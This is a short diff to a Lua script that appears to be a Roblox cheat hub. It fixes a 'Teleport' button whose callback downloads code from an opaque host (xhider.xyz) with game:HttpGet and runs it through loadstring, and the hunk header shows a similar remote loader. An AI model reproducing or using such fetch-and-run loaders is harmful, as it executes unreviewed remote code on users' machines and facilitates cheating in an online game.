@@ -594,7 +594,8 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/vertex-peak/vertex/re
                 Tabs.Main:AddButton({
      Title = "Teleport",
     Callback = function()
-local Tele = getgenv().scriptName = 'Script/TP';loadstring(game:HttpGet('https://xhider.xyz/raw/a/a.a'))()
+getgenv().scriptName = 'Script/TP'
+local Tele = loadstring(game:HttpGet('https://xhider.xyz/raw/a/a.a'))()
   end
   })
 
